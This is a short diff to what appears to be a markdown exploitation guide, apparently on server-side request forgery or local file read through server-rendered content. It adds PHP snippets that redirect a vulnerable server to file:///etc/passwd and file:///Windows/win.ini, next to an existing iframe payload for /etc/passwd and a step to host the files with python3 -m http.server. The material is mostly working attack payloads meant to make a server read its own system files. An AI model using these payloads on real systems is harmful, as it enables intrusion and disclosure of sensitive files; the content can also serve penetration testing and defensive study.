@@ -12,6 +12,20 @@ Linux
     
     <iframe src="/etc/passwd" height=1000 width=1000 />
 
+#### If the server uses PHP, you can create an index.php file instead with this content
+
+Windows
+
+    <?php
+    header('Location: file:///Windows/win.ini');
+    ?>
+
+Linux
+
+    <?php
+    header('Location: file:///etc/passwd');
+    ?>
+
 ### 2) Host it on an HTTP server
 
     python3 -m http.server 80
